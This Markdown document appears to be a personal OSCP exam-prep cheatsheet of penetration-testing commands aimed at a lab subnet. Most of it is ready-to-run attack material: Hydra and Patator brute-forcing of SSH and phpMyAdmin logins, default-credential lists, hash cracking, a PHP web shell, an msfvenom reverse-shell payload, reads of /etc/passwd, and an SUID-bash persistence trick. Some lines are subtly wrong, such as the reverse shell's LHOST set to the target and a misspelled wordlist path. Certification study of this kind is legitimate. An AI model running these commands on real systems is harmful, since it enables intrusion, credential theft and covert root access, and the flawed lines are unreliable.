## OSCP Cheatsheet
**Author:** Victor Fernandez III

### Reconnaissance
| Network ID | Subnet Mask | Default Gateway | Computers |
| ---------- | ----------- | --------------- | ---------------- |
| 10.11.12.0 | 255.255.255.0 | 10.11.12.254 | 5 |

### Enumeration
| IP Address | Ports | Services | OS |
| ---------- | ----- | -------- | --- |
| 10.11.12.13 | 445 | SMB | Windows 10 | 
| 10.11.12.23 | 25 | SMTP | Debian Linux | 
| 10.11.12.25 | 2049 | NFS | FreeBSD | 
| 10.11.12.69 | 22 | SSH | Fedora Linux | 
| 10.11.12.123 | 80 | HTTP | Windows Server 2012 R2 | 

#### Ports
```bash
TARGET=10.11.12.13
```

```bash
sudo nmap $TARGET -sS -sU -oN scans/$TARGET-nmap-initial
```

```bash
sudo nmap $TARGET -sS -sU -p- -oN scans/$TARGET-nmap-complete
```

#### Services
| Port | Service | Provides |
| ---- | -------- | -------- |
| 21   | FTP      | Credentials, File upload |
| 22   | SSH      | Remote access |
| 25   | SMTP     | Code execution, Credentials |
| 80   | HTTP     | Code execution, Credentials |
| 110  | POP3     | Code execution, Credentials |
| 111  | NFS      | Credentials |
| 135  | RPC      | Enumeration |
| 445  | SMB      | Credentials, Remote access |
| 873  | Rsync    | File upload |
| 6667 | IRC      | Credentials |

#### Versions
```bash
sudo nmap $TARGET -sV -sC $(print-open-ports-from-nmap-scan scans/$TARGET-nmap-complete) -oN scans/$TARGET-nmap-versions
```

#### Operating System
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os
```

#### FTP
I recommend creating and changing directories to a folder called "loot." It's important to stay organized (and you never know when there's something to download). 
```bash
mkdir loot
cd loot
```

Create a file to test your ability to upload.
```bash
touch poo.txt
```

Login (try using anonymous:anonymous, anonymous:password, guest:guest, etc.).
```bash
ftp $TARGET 21
```

List files.
```bash
ls
```

List files (using Curl). 
```bash
curl ftp://anonymous:anonymous@$TARGET:21
```

Change to Binary mode (an important setting if you're uploading/downloading binary files like pictures and/or executables!). 
```bash
binary 
```

Download a file.
```bash
get file.txt
```

Download all files.
```bash
mget *
```

Download all files to the current directory (using Wget).
```bash
wget -m ftp://anonymous:anonymous@$TARGET:21 -nd
```

Upload a file.
```bash
put poo.txt
```

End a FTP session.
```bash
exit
```

#### SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
```

#### SMTP
```bash
sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$NAME-nmap-scripts-smtp-commands
```

```bash
sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$NAME-nmap-scripts-smtp-enum-users
```

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET
```

Automated enumeration of exploitable SMTP vulnerabilities.
```bash
sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
# replace the lines above with the actual scan results
```

#### HTTP
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-http-shellshock-80
```

```bash
dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
```

```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
```

```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80
```

#### RPC
```bash
rpcclient -U '' $TARGET
srvinfo
netshareenum
```

#### NetBIOS
```bash
nbtscan $TARGET
```

#### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET
```

The SMB shares discovered have the following permissions.
```bash
smbmap -H $TARGET
```

Download files.
```bash
cd loot
smbclient \\\\$TARGET\\$SHARE
prompt
mget *
```

```bash
# check if vulnerable to EternalBlue
sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010
```

The target is NOT vulnerable to SambaCry.
```bash
# check if vulnerable to SambaCry
sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
```

#### SQL
```bash
mysql -u $USER -h $TARGET
```

#### RDP
```bash
sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
```

```bash
rdesktop -u administrator $TARGET
```

#### Postgres
TCP port 5437.
```bash
psql -U postgres -p 5437 -h $TARGET # postgres:postgres
SELECT pg_ls_dir('/');
```

#### WinRM
```bash
evil-winrm -u $USER -p $PASSWORD -i $TARGET
```

### Gaining Access
#### Password Guessing  
Default Credentials
```bash
# anonymous:anonymous
# guest:guest
# admin:admin
# admin:adminadmin
```

Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```

Patator
```bash
patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
```

Hashcat
```hash
# modes 
# - SHA256: 1400
# - RAR5: 13000

# attacks
# - Dictionary: 0
```

```bash
hashcat -m $MODE -a $ATTACK /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
```

```bash
hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
```

```bash

hashcat -m 13000 -a 0 rar.hash /usr/share/wordlists/rockyou.txt
```

John the Ripper
```bash
# cracking a RAR file
rar2john backup.rar > hash.txt
john --format=rar hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Remote File Inclusion
```bash
# find a way to upload a PHP command shell
vim cmd.php
<?php echo shell_exec($_GET['cmd']); ?>
```

#### Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
```

### Maintaining Access
#### Linux Privilege Escalation
```bash
whoami
uname -a
cat /etc/passwd
cat /etc/crontab
find / -perm -u=s -type f 2> /dev/null # files with SUID-bit set
find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null # files my group can edit
ps aux | grep -v "\[" | grep root
dpkg -l # debian
rpm -qa # red hat
pacman -Qe # arch linux
```

#### Windows Privilege Escalation
```bash
whoami
whoami /priv
net user
systeminfo
dir c:\
wmic service get name,startname
cd "c:\program files"
cd "c:\program files (x86)"
wmic service get name,pathname,startname | findstr "Program Files"
cacls *.exe
```

#### Persistence  
Rootbash (Credit: Tib3rius)
```bash
# as root, create a copy of BASH and then set the SUID-bit
# to resume root-access execute the new binary using -p
cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
/tmp/bash -p
```

Add a new user to a SQL database
```sql
INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
```

## References
Local File Inclusions
- https://www.techsec.me/2020/09/local-file-inclusion-to-rce.html
- https://packetstormsecurity.com/files/89823/vtiger-CRM-5.2.0-Shell-Upload.html

SQL Injection
- http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- https://pentesterlab.com/exercises/from_sqli_to_shell/course
- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries
- https://www.w3schools.com/tags/ref_urlencode.ASP

Windows
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration

Exam Tips
- https://markeldo.com/how-to-pass-the-oscp/
- https://fareedfauzi.gitbook.io/oscp-notes/
- https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md
- https://guide.offsecnewbie.com/

Tools
- https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

Walkthroughs
- https://www.trenchesofit.com/